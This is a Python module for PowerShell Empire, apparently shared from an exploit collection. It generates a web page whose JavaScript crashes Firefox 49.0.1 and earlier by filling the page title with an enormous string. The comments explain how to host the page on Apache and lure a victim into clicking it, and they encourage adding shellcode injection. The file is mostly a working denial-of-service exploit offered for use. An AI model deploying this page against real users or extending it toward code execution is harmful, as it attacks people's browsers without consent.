from lib.common import helpers
import os 

##
# This Stager Only Works With Powershell Empire
##

####
# Stager Name        : Firefox crash Denial of Service
# Module Author      : Chaitanya | Twitter : @Indi_G34r
# Vulnerable Version : 49.0.1/ Lower Than that
# Tested on          : Ubuntu & Windows7 Ultimate
# Software Link      : http://www.mozilla.org 
###

##
#How To Install
##
#Do Git clone from http://github.com/ChaitanyaHaritash/My-Exploits
#Paste the module into /{path}/Empire/lib/stagers
#sudo ./empire

##
#Requirements : 
#1. Apache
#2. Powershell Empire

##
#Usage
##
#(Empire) > listeners
#(Empire) > run
#(Empire) > Set {listener options}
#(Empire) > usestager Firefox49_DOS
#(Empire) > set listener {id}
#(Empire: stager/Firefox49_DOS) > set OutFile {Recommended[/var/www/html/(filename.html)]}
#(Empire: stager/Firefox49_DOS) > execute
#Now pass the URL to the victim using vulnerable browser and wait for his click :) 

#{Note} : Its just a Crash exploit but you can add shellcode injection to it, but as far as my knowledege is 
#         concerned, i didn't found any method to invoke shellcode to add that provision to it :).
#         I even tried 'Invoke-Shellcode.ps1' from powersploit , but it didn't worked too.
#         All the best :)     

#Greets  : SSA , HSH , r00t 3xp10it , Aaditya Purani , N3O H4ck3r , Manish Kishan Tanwar , Suriya Prakash , VirKid , 
#          Sam Anjan , Biprodeep roy , Deepanshu Khanna , Stelios Kouk , Mr.Z , OJ , King Ali
#          Zahid Adeel , Hewo Smith ,  and to all my knowns 

source = '''

Denial-Of-Service Discovered in Firefox =< 49.0.1 allows attacker to forcebily crash browser of victim once user visits the malicious URL and click on button to trigger the exploit code crafted by an attacker.
                       Author : Chaitanya | Twitter : @Indi_G34r

                                     Date : 15 Oct 2016 
                            Readables :

                            https://www.exploit-db.com/exploits/40536/

 http://www.hackinguyz.blogspot.com

        '''
class Stager:
 
    def __init__(self, mainMenu, params=[]):
 
        self.info = {
            'Name': 'Firefox =< 49.0.1 crash Denial of Service',    

            'Author': ['Chaitanya | @Indi_G34r'],
 
            'Description': (source),
 
        }
 
        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },

            'OutFile' : {
                'Description'   :   'File to output HTML. (Recommendation : /var/www/html/)',
                'Required'      :   True,
                'Value'         :   ''
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'

            }
        }
 
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
 
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
 
 
    def generate(self):
 
        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
 
 
        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent)
 
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
                 print ""
                 os.system('sudo service apache2 start')
                 print ""
                 print "[+] Now just pass the malicious URL redirecting to your html file to the Victim [+]"
                 code = ('''<html>
                            <head>
                            <title>Firefox 49.0.1 Vulnerability</title>
                            </br>
                            <h1>Firefox 49.0.1 Vulnerability <h1>
                            </div>
                            </body>
                            <script type="text/javascript">
                            function ex() {
                                var buffer = "";
                                for (var i = 0; i < 50000; i++) {
                                    buffer += "\x41";
                                }
                                var buffer2 = buffer;
                                for (i = 0; i < 5000; i++) {
                                    buffer2 += buffer;
                                }
                                document.title = buffer2;
                            }
                            </script></head><body>'helo firefox'<a href="javascript:ex();">CLICK
                            </a></body></html>''')
        return code
